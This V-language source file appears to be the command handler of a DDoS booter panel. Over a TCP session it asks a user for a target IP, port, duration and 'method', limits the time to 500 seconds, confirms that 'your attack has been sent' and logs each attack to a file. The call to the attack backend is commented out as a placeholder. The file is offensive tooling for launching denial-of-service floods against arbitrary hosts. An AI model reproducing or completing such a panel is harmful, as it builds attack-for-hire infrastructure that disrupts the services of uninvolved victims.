module server

import net
import os
import net.http
import io
import server


pub fn attack(mut conn net.TcpConn, user string) {

	mut maxtime := 500

	mut reader := io.new_buffered_reader(reader: conn)
 	conn.write_string("IP: ") or { 0 }
    	mut ip := reader.read_line() or {" "}
    	conn.write_string("Port: ") or { 0 }
    	mut port := reader.read_line() or {" "}
    	conn.write_string("Time: ") or { 0 }
		mut time := reader.read_line() or {" "}
		conn.write_string("Method: ") or { 0 }
		mut method := reader.read_line() or {" "}

	if time.int() > maxtime {
		conn.write_string("MaxTime Exceeded MaxTime is ${maxtime}!") or { 0 }
	} else {
		//mut get := http.get("yourapihere") or {    testing if logs work
		//	panic("Failed")
		//}
		println("${user} sent attack to ${ip} using ${method} on port [${port}] for ${time}")
		conn.write_string("\033[H\033[2J") or { 0 }
		conn.write_string("${user} your attack has been sent to ${ip} using ${method} on port [${port}] for ${time} ") or { 0 }   // add user sent
		mut g := os.open_append("logs/attack_logs.txt") or {
			panic("[X]File Not Found[X]")
		}
		g.write("\r\nAttack sent to ${ip} using ${method} on port [${port}] for ${time} seconds.".bytes()) or { 0 }
		g.close()
	}
}
